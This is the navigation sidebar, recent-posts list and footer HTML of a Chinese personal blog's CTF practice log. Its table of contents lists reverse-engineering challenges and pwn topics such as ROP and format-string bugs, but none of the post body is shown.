class="toc-link" href="#7-RSA1"><span class="toc-number">7.</span> <span class="toc-text">7.RSA1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-login"><span class="toc-number">8.</span> <span class="toc-text">8.login</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#9-CrackRTF"><span class="toc-number">9.</span> <span class="toc-text">9.CrackRTF</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#10-WUSTCTF2020-level1"><span class="toc-number">10.</span> <span class="toc-text">10.[WUSTCTF2020]level1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#11-GUET-CTF2019-re1"><span class="toc-number">11.</span> <span class="toc-text">11.[GUET-CTF2019]re1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Z3%E4%BB%8B%E7%BB%8D%EF%BC%8C%E4%BB%80%E4%B9%88%E6%98%AFZ3%EF%BC%9F"><span class="toc-number">11.1.</span> <span class="toc-text">Z3介绍，什么是Z3？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Z3%E5%9C%A8CTF%E9%80%86%E5%90%91%E4%B8%AD%E6%9C%89%E4%BB%80%E4%B9%88%E7%94%A8%EF%BC%9F"><span class="toc-number">11.2.</span> <span class="toc-text">Z3在CTF逆向中有什么用？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Z3%E8%AF%AD%E6%B3%95%E7%AE%80%E4%BB%8B%EF%BC%9A"><span class="toc-number">11.3.</span> <span class="toc-text">Z3语法简介：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%A0%E4%B8%AA%E5%B8%B8%E7%94%A8API"><span class="toc-number">11.4.</span> <span class="toc-text">几个常用API</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#12-2019%E7%BA%A2%E5%B8%BD%E6%9D%AF-easyRE1"><span class="toc-number">12.</span> <span class="toc-text">12.[2019红帽杯]easyRE1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#13-MRCTF2020-Transform1"><span class="toc-number">13.</span> <span class="toc-text">13.[MRCTF2020]Transform1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#14-WUSTCTF2020-level21"><span class="toc-number">14.</span> <span class="toc-text">14.[WUSTCTF2020]level21</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#15-SUCTF2019-SignIn1"><span class="toc-number">15.</span> <span class="toc-text">15.[SUCTF2019]SignIn1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#16-ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-usualCrypt1"><span class="toc-number">16.</span> <span class="toc-text">16.[ACTF新生赛2020]usualCrypt1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8D%A2%E8%A1%A8%E7%9A%84base64%E8%A7%A3%E5%AF%86"><span class="toc-number">16.1.</span> <span class="toc-text">换表的base64解密</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#17-MRCTF2020-Xor1"><span class="toc-number">17.</span> <span class="toc-text">17.[MRCTF2020]Xor1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#18-MRCTF2020-hello-world-go1"><span class="toc-number">18.</span> <span class="toc-text">18.[MRCTF2020]hello_world_go1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#19-%E7%9B%B8%E5%86%8C1"><span class="toc-number">19.</span> <span class="toc-text">19.相册1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#20-WUSTCTF2020-level3"><span class="toc-number">20.</span> <span class="toc-text">20.[WUSTCTF2020]level3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#21-FlareOn4-IgniteMe"><span class="toc-number">21.</span> <span class="toc-text">21.[FlareOn4]IgniteMe</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#23-GWCTF-2019-xxor"><span class="toc-number">22.</span> <span class="toc-text">23.[GWCTF 2019]xxor</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#24-WUSTCTF2020-Cr0ssfun"><span class="toc-number">23.</span> <span class="toc-text">24.[WUSTCTF2020]Cr0ssfun</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#25-FlareOn6-Overlong"><span class="toc-number">24.</span> <span class="toc-text">25.[FlareOn6]Overlong</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#26-UTCTF2020-basic-re"><span class="toc-number">25.</span> <span class="toc-text">26.[UTCTF2020]basic-re</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#27-FlareOn3-Challenge1"><span class="toc-number">26.</span> <span class="toc-text">27.[FlareOn3]Challenge1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#28-ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-Oruga"><span class="toc-number">27.</span> <span class="toc-text">28.[ACTF新生赛2020]Oruga</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#29-%E7%89%B9%E6%AE%8A%E7%9A%84-BASE64"><span class="toc-number">28.</span> <span class="toc-text">29.特殊的 BASE64</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#30-BJDCTF2020-BJD-hamburger-competition"><span class="toc-number">29.</span> <span class="toc-text">30.[BJDCTF2020]BJD hamburger competition</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#31-ACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020-Universe-final-answer"><span class="toc-number">30.</span> <span class="toc-text">31.[ACTF新生赛2020]Universe_final_answer</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E7%90%86%E6%95%B0-Real-%E5%9E%8B%E8%A7%A3%E6%96%B9%E7%A8%8B%E6%B1%82%E8%A7%A3"><span class="toc-number">30.0.1.</span> <span class="toc-text">有理数(Real)型解方程求解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%8D%E5%90%91%E9%87%8F-BitVec-%E5%9E%8B%E8%A7%A3%E6%96%B9%E7%A8%8B"><span class="toc-number">30.0.2.</span> <span class="toc-text">位向量(BitVec)型解方程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#32-Zer0pts2020-easy-strcmp"><span class="toc-number">31.</span> <span class="toc-text">32.[Zer0pts2020]easy strcmp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#33-WUSTCTF2020-level4"><span class="toc-number">32.</span> <span class="toc-text">33.[WUSTCTF2020]level4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#34-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-singal"><span class="toc-number">33.</span> <span class="toc-text">34.[网鼎杯 2020 青龙组]singal</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#35-crackMe"><span class="toc-number">34.</span> <span class="toc-text">35.crackMe</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#36-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easyre1"><span class="toc-number">35.</span> <span class="toc-text">36[羊城杯 2020]easyre1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-number">36.</span> <span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#test-your-nc"><span class="toc-number">36.1.</span> <span class="toc-text">test_your_nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rip1"><span class="toc-number">36.2.</span> <span class="toc-text">rip1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#warmup-csaw-2016"><span class="toc-number">36.3.</span> <span class="toc-text">warmup_csaw_2016</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2019-n-1"><span class="toc-number">37.</span> <span class="toc-text">ciscn_2019_n_1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse%E5%AD%A6%E4%B9%A0"><span class="toc-number">38.</span> <span class="toc-text">Reverse学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XTEA"><span class="toc-number">38.1.</span> <span class="toc-text">XTEA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXTEA"><span class="toc-number">38.2.</span> <span class="toc-text">XXTEA</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%8F%E5%AD%97"><span class="toc-number">38.3.</span> <span class="toc-text">脏字</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sp-analysis-failed%EF%BC%88%E6%B2%A1%E5%8A%9E%E6%B3%95f5%EF%BC%89"><span class="toc-number">38.4.</span> <span class="toc-text">sp analysis failed（没办法f5）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E8%87%AA%E7%84%B6%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B"><span class="toc-number">38.5.</span> <span class="toc-text">非自然程序流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#angr"><span class="toc-number">38.6.</span> <span class="toc-text">angr</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#00angr"><span class="toc-number">38.6.1.</span> <span class="toc-text">00angr</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#01angr"><span class="toc-number">38.6.2.</span> <span class="toc-text">01angr</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#02angr"><span class="toc-number">38.6.3.</span> <span class="toc-text">02angr</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#03angr"><span class="toc-number">38.6.4.</span> <span class="toc-text">03angr</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">39.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include1%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89"><span class="toc-number">39.1.</span> <span class="toc-text">[ACTF2020 新生赛]Include1（文件包含）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn%E5%AD%A6%E4%B9%A0"><span class="toc-number">40.</span> <span class="toc-text">pwn学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Cyclic-Pattern"><span class="toc-number">40.1.</span> <span class="toc-text">Cyclic Pattern</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ELF%E6%93%8D%E4%BD%9C"><span class="toc-number">40.2.</span> <span class="toc-text">ELF操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%ACROP"><span class="toc-number">40.3.</span> <span class="toc-text">基本ROP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#return-to-text"><span class="toc-number">40.4.</span> <span class="toc-text">return to text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%B5%8B%E9%87%8F%E5%8F%98%E9%87%8F%E6%BA%A2%E5%87%BA%E9%95%BF%E5%BA%A6"><span class="toc-number">40.5.</span> <span class="toc-text">手动测量变量溢出长度</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#return-to-shellcode"><span class="toc-number">40.6.</span> <span class="toc-text">return to shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2syscall"><span class="toc-number">40.7.</span> <span class="toc-text">ret2syscall</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#return-to-libc"><span class="toc-number">40.8.</span> <span class="toc-text">return to libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">40.9.</span> <span class="toc-text">格式化字符串漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86"><span class="toc-number">40.10.</span> <span class="toc-text">堆</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">40.11.</span> <span class="toc-text">工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#checksec"><span class="toc-number">40.11.1.</span> <span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwntool"><span class="toc-number">40.11.2.</span> <span class="toc-text">pwntool</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwndbg"><span class="toc-number">40.11.3.</span> <span class="toc-text">pwndbg</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROPgadget"><span class="toc-number">40.11.4.</span> <span class="toc-text">ROPgadget</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#linux%E8%87%AA%E5%B8%A6%E5%B7%A5%E5%85%B7"><span class="toc-number">40.11.4.1.</span> <span class="toc-text">linux自带工具</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#base64%E7%BC%96%E7%A0%81"><span class="toc-number">40.11.4.1.1.</span> <span class="toc-text">base64编码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">40.11.4.1.2.</span> <span class="toc-text">查看文件基本信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BF%A1%E6%81%AF"><span class="toc-number">40.11.4.1.3.</span> <span class="toc-text">查看二进制文件字符串信息</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E6%89%80%E4%BD%BF%E7%94%A8%E7%9A%84%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93"><span class="toc-number">40.11.4.1.4.</span> <span class="toc-text">查看文件所使用的的动态链接库</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/09/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="计算机系统结构学习笔记"><img src="/linear-gradient(20deg,%20#0062be,%20#925696,%20#cc426e,%20#fb0347)" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="计算机系统结构学习笔记"/></a><div class="content"><a class="title" href="/2024/09/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="计算机系统结构学习笔记">计算机系统结构学习笔记</a><time datetime="2024-09-16T08:52:10.000Z" title="发表于 2024-09-16 16:52:10">2024-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/03/%E6%96%87%E7%8C%AE%E6%9F%A5%E6%89%BE%E6%94%BB%E7%95%A5/" title="文献查找攻略"><img src="/2024/07/03/%E6%96%87%E7%8C%AE%E6%9F%A5%E6%89%BE%E6%94%BB%E7%95%A5/bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文献查找攻略"/></a><div class="content"><a class="title" href="/2024/07/03/%E6%96%87%E7%8C%AE%E6%9F%A5%E6%89%BE%E6%94%BB%E7%95%A5/" title="文献查找攻略">文献查找攻略</a><time datetime="2024-07-03T12:05:27.000Z" title="发表于 2024-07-03 20:05:27">2024-07-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/04/26/TED-learning/" title="TED learning"><img src="/linear-gradient(20deg,%20#0062be,%20#925696,%20#cc426e,%20#fb0347)" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="TED learning"/></a><div class="content"><a class="title" href="/2024/04/26/TED-learning/" title="TED learning">TED learning</a><time datetime="2024-04-25T16:42:42.000Z" title="发表于 2024-04-26 00:42:42">2024-04-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/04/15/2024%E5%A4%A7%E5%94%90%E6%9D%AF%E5%87%86%E5%A4%87/" title="2024大唐杯准备"><img src="/linear-gradient(20deg,%20#0062be,%20#925696,%20#cc426e,%20#fb0347)" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024大唐杯准备"/></a><div class="content"><a class="title" href="/2024/04/15/2024%E5%A4%A7%E5%94%90%E6%9D%AF%E5%87%86%E5%A4%87/" title="2024大唐杯准备">2024大唐杯准备</a><time datetime="2024-04-15T13:57:03.000Z" title="发表于 2024-04-15 21:57:03">2024-04-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/14/%E5%A4%A7%E5%88%9B%E5%BC%80%E5%8F%91%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95/" title="大创开发部署记录"><img src="/2024/03/14/%E5%A4%A7%E5%88%9B%E5%BC%80%E5%8F%91%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95/1.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="大创开发部署记录"/></a><div class="content"><a class="title" href="/2024/03/14/%E5%A4%A7%E5%88%9B%E5%BC%80%E5%8F%91%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95/" title="大创开发部署记录">大创开发部署记录</a><time datetime="2024-03-14T14:49:36.000Z" title="发表于 2024-03-14 22:49:36">2024-03-14</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/img1.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By mobb</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>